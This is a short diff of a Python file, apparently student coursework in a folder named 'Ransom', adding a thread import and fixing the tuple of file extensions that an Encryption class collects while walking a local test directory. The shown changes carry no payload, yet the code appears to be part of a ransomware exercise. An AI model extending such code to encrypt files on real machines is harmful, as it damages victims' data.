@@ -7,6 +7,7 @@ import random
 import socket
 from datetime import datetime
 import threading
+from threading import Thread
 from queue import Queue
 import mysql.connector as mysql
 from mysql.connector import Error
@@ -46,7 +47,7 @@ class Encryption:
         self.root.mainloop()
 
     def encryption(self):
-        self.encrypted_ext = ('.txt')
+        self.encrypted_ext = ('.txt',)
         #files from machine
         self.file_paths = []
         for root, dirs, files in os.walk("E:\Python Semester 2\Assignment\Ransom\Test Files for encryption"):
